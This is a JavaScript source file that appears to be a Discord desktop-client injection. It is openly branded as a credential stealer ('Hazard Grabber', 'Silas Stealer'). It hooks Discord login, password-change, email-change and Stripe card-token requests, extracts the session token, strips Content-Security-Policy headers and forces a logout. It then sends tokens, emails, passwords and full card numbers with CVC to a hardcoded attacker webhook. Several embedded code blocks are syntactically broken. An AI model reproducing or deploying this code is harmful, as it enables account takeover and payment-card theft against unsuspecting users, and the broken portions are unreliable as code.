const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')
const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var webhook = "https://ptb.discord.com/api/webhooks/940891156701663254/JXGahwh0ebKrmW2wP1dcBEm5-U1jNcRqhJ6SY4Va6QI0UvkrTLgOrdMCJo9Re-Scck5F";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Hazard"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1

}
function GetNitro(flags) {
    if (flags == 0) {
        return "No Nitro"
    }
    if (flags == 1) {
        return " <a:classic:940587229443674142>   \`Nitro Classic\`"
    }
    if (flags == 2) {
        return "<a:nitrobooster:940587164385824768> \`Nitro Boost\`"
    } else {
        return "No Nitro"
    }
}
function GetBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<a:dcstaff:940586479971860510> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:dcpartner:940586351659724810>"
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:dchypeevents:940586822088671282> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:dcnormalbughunter:940586637279248395>"
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "<:dcbravery:940586879307366460>"
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "<:dcbrilliance:940586946529472572>"
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "<:dcbalance:940587001428705291>"
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<a:dcearly:940586245292171275>"
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:dcshinybughunter:940586543318446091>"
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:dcdev:940586119840550992>"
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}

function PM(sex) {
    
var pm = JSON.parse(sex)
    var billing = "";
    pm.forEach(z => {
        if (z.type == "") {
            return "\`❌\`"
        } else if (z.type == 2 && z.invalid != !0) {
            billing += "\`✔️\`" + " :paypal:"
        } else if (z.type == 1 && z.invalid != !0) {
            billing += "\`✔️\`" + " 💳"
        } else {
            return "\`❌\`"
        }
    })
    if (billing == "") {
        billing = "\`❌\`"
    }
    return billing


}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})

const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(info) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}


function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "Hazard Grabber",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                        {
                            "name": "**Account Info**",
                            "value": `Email: ${email} - Password: ${password}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "Hazard Grabber",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                        {
                            "name": "**Password Changed**",
                            "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                            "inline": true
                        },
                        {
                            "name": "**Other Info**",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                    }                 
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "Hazard Grabber",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                        {
                            "name": "**Email Changed**",
                            "value": `New Email: ${newemail}\nPassword: ${password}`,
                            "inline": true
                        },
                        {
                            "name": "**Other Info**",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                    }                
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "Hazard Grabber",
            content: "@everyone",
            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                        {
                            "name": "**Credit Card Added**",
                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
                            "inline": true
                        },
                        {
                            "name": "**Other Info**",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username + "#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

const UrlFilter = {
	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((sex) => {
				window.webContents.executeJavaScript(`

    const json = JSON.parse(info);
    var params = {
        username: "Silas Stealer",
        content: "",
        avatar_url: "https://media.discordapp.net/attachments/939050981478510673/942393837584793630/images_56.jpeg",
        embeds: [
            {
                "color": 2303786,
                "fields": [
{
"name": "<a:Blac:942395582293614614> **Token:**",
                        "value": `${token}`,
                        "inline": false
},
                    {
                        "name": "<:email:942396358315376671> **Email:**",
                        "value": `${data.login}`,
                        "inline": true
                    },
                    {
                        "name": "**<a:pass:942396025228902430> Password:**",
                        "value": `\`${data.password}\``,
                        "inline": false
                    },
{
"name": "<a:badges:942395694134751323> **Badges:**",
                        "value": `${GetBadges(json.flags)}`,
                        "inline": false
},
{
"name": " <a:nitro:942395826544705626> **Nitro Type:**",
                        "value": `${GetNitro(json.premium_type)}`,
                        "inline": false
},
{
    "name": " <a:nitro:942395826544705626> **Billing:**",
                            "value": `${PM(sex)}`,
                            "inline": false
    },


                ],
                "author": {
                    "name": json.username +"#" + json.discriminator,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Silas Stealer ftw"
                }
            }
        ]
    }
    SendToWebhook(JSON.stringify(params))
})
    
			}))
}))
		}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((sex) => {
window.webContents.executeJavaScript(`
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
xmlHttp.setRequestHeader("Authorization", "${token}");
xmlHttp.send( null );
xmlHttp.responseText;`, !0).then((info) => {
    const json = JSON.parse(info);
    var params = {
        username: "Silas Stealer",
        content: "",
        avatar_url: "https://media.discordapp.net/attachments/939050981478510673/942393837584793630/images_56.jpeg",
        embeds: [
            {
                "color": 2303786,
                "fields": [
{
"name": "<a:Blac:942395582293614614> **Token:**",
                        "value": `${token}`,
                        "inline": false
},
                    {
                        "name": "<:email:942396358315376671> **Email:**",
                        "value": `${data.email}`,
                        "inline": true
                    },
                    {
                        "name": "**<a:pass:942396025228902430>New  Password:**",
                        "value": `${data.new_password}`,
                        "inline": false
                    },
{
"name": "<a:badges:942395694134751323> **Badges:**",
                        "value": `${GetBadges(json.flags)}`,
                        "inline": false
},
{
"name": " <a:nitro:942395826544705626> **Nitro Type:**",
                        "value": `${GetNitro(json.premium_type)}`,
                        "inline": false
},
{
    "name": " <a:nitro:942395826544705626> **Billing:**",
                            "value": `${PM(sex)}`,
                            "inline": false
    },

                ],
                "author": {
                    "name": json.username +"#" + json.discriminator,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Silas Stealer ftw"
                }
            }
        ]
    }
    SendToWebhook(JSON.stringify(params))
})
                    }))
                    
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
				var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((sex) => {		
window.webContents.executeJavaScript(`
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
xmlHttp.setRequestHeader("Authorization", "${token}");
xmlHttp.send( null );
xmlHttp.responseText;`, !0).then((info) => {
    const json = JSON.parse(info);
    var params = {
        username: "Silas Stealer",
        content: "",
        avatar_url: "https://media.discordapp.net/attachments/939050981478510673/942393837584793630/images_56.jpeg",
        embeds: [
            {
                "color": 2303786,
                "fields": [
{
"name": "<a:Blac:942395582293614614> **Token:**",
                        "value": `${token}`,
                        "inline": false
},
                    {
                        "name": "<:email:942396358315376671> **New Email:**",
                        "value": `${data.email}`,
                        "inline": true
                    },
                    {
                        "name": "**<a:pass:942396025228902430>New  Password:**",
                        "value": `${data.password}`,
                        "inline": false
                    },
{
"name": "<a:badges:942395694134751323> **Badges:**",
                        "value": `${GetBadges(json.flags)}`,
                        "inline": false
},
{
"name": " <a:nitro:942395826544705626> **Nitro Type:**",
                        "value": `${GetNitro(json.premium_type)}`,
                        "inline": false
},
{
    "name": " <a:nitro:942395826544705626> **Billing:**",
                            "value": `${PM(token)}`,
                            "inline": false
    },

                ],
                "author": {
                    "name": json.username +"#" + json.discriminator,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Silas Stealer ftw"
                }
            }
        ]
    }
    SendToWebhook(JSON.stringify(params))
})
                    }))
                    
					}))
				}
			}
		}
	}
	if (details.url.endsWith("tokens")) {
		const item = querystring.parse(details.uploadData[0].bytes.toString())
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
	}
});
module.exports = require('./core.asar')
